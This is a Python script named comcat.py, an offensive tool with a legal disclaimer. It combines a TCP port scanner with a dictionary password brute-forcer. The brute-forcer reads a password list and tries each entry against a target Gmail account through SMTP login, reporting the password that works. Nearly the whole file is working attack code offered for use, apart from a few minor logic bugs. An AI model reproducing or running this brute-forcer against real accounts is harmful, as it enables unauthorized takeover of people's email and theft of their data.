#                                          LEGAL DISCLAIMER 
#       Usage of this program for attacking targets without prior mutual consent is illegal. 
#       Developer assume no liability and are not responsible for any misuse or damage caused by this program.

import socket
import sys
import smtplib
from os import system
import time
import os

def help():
    print("Usage: comcat.py [options]\n")
    print("                              => options <=\n")
    print("-h, -H, -P    Host ip address and check to port (e.g. comcat.py -H 192.168.1.1 -P 80 or comcat.py -H 192.168.1.1)")
    print("-M, -P        Target mail address and password file path (e.g. comcat.py -M target@gmail.com -P root\Desktop\pass.txt)\n")
    
def banner():
    print ("\n")
    print ("LEGAL DISCLAIMER\n")
    print("Usage of this program for attacking targets without prior mutual consent is illegal.\n") 
    print("Developer assume no liability and are not responsible for any misuse or damage caused by this program.")
     

if len(sys.argv) > 1:
    if len(sys.argv) == 3:
        if sys.argv[1] == "-h" or "-H":
            banner()
            closeportcount = 0
            t1 = time.strftime('%X')
            remoteServer = sys.argv[2]
            print ("\n" +10 * " " + "Started at:",t1)
            print ("\n[{}][INFO]: Please wait, Scanning remote host".format(t1),remoteServer)    
            try:
                for port in range(1,1024):
                    remoteServerIP  = socket.gethostbyname(remoteServer)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect_ex((remoteServerIP, port))
                    if result == 0:
                        t2 = time.strftime("%X")
                        print ("[{}][INFO]: Open Port: ".format(t2),port)
                    else:
                        closeportcount = closeportcount + 1      
                    sock.close()
            except KeyboardInterrupt:
                t3 = time.strftime("%X")
                print ("[{}][CRITICAL]: 'User Quit' ".format(t3))
                print ("\n"+10*" " +"Shutting at:",t3)
                sys.exit()
            except socket.gaierror:
                t4 = time.strftime("%X")
                print ("\n[{}][CRITICAL]: Hostname could not be resolved. Exiting".format(t4))
                print ("\n"+10*" " +"Shutting at:",t3)
                sys.exit()
            t6 = time.strftime("%X")
            print ("[{}][INFO]: {} port is closed".format(t6,closeportcount+1))
            print ("\n"+10*" " +"Shutting at:", t6)
            sys.exit()
        
    elif len(sys.argv) == 5:
        banner()
        param1 = sys.argv[1]
        param2 = sys.argv[2]
        param3 = sys.argv[3]
        param4 = sys.argv[4]
        if ((param1 == "-M") and (param3 == "-P")):
            t1 = time.strftime('%X')
            print ("\n" +5 * " " + "Started at:",t1+"\n")
            i = 0
            file_path= sys.argv[4] 
            pass_file = open(file_path,"r")
            pass_list = pass_file.readlines()
            user_name = sys.argv[2]
         
            for password in pass_list:
                i = i + 1
                pass_count = str(i) + '-' + str(len(pass_list))
                try:
                    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                    server.ehlo()
                    server.login(user_name, password)
                    print ("[INFO]: Login Succesfuly, password :" + password)
                    break
                except smtplib.SMTPAuthenticationError as e:
                    t2 = time.strftime('%X')
                    error = str(e)
                    if error[14] == '<':
                        print ("[INFO]: Login Succesfuly, password :" + password )
                        break
                    else:
                        print ("[{}][ATTEMPT]: target: {}  pass: {} ".format(t2,user_name,password))
                except KeyboardInterrupt:
                    t3 = time.strftime('%X')
                    print ("["+t3+"][CRITICAL]: User Quit")
                    sys.exit()
                except socket.error:
                    t4 = time.strftime('%X')
                    print ("["+t4+"][ERROR]: Check your Internet Connection")
                    print ("\n"+5*" "+"Shutting at: "+t4)
                    sys.exit()
            t5 = time.strftime('%X')
            print ("\n"+5*" "+"Shutting at: "+t5)
        elif (param1 == "-H") and (param3 == "-P"):
            #banner()
            t1 = time.strftime('%X')
            remoteServer = param2
            port = int(param4)
            print ("\n" +10 * " " + "Started at:",t1)
            print ("\n[{}][INFO]: Check port {} on the {}".format(t1,port,remoteServer))    
            try:
                remoteServerIP  = socket.gethostbyname(remoteServer)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((remoteServerIP, port))
                if result == 0:
                    t2 = time.strftime("%X")
                    print ("[{}][INFO]: Port: {} Status: OPEN".format(t2,port))
                elif result == 10061:
                    t3 = time.strftime("%X")
                    print("[{}][INFO]: Port: {} Status: CLOSE".format(t3,port))
                sock.close()
            except KeyboardInterrupt:
                t4 = time.strftime("%X")
                print ("[{}][CRITICAL]: 'User Quit' ".format(t4))
                print ("\n"+10*" " +"Shutting at:",t4)
                sys.exit()
            except socket.gaierror:
                t5 = time.strftime("%X")
                print ("\n[{}][CRITICAL]: Hostname could not be resolved. Exiting".format(t5))
                print ("\n"+10*" " +"Shutting at:",t5)
                sys.exit()
            except socket.error:
                t6 = time.strftime('%X')
                print ("["+t6+"][ERROR]: Check your Internet Connection")
                sys.exit()
            sock.close()
            t7 = time.strftime("%X")
            print ("\n"+10*" " +"Shutting at:", t7)
            sys.exit()
        else:
            print("Check argüments")
        
else:
    banner()
    print ("\nError: Please make sure you entered the parameters correctly!\n")
    help()
    os.system("pause")
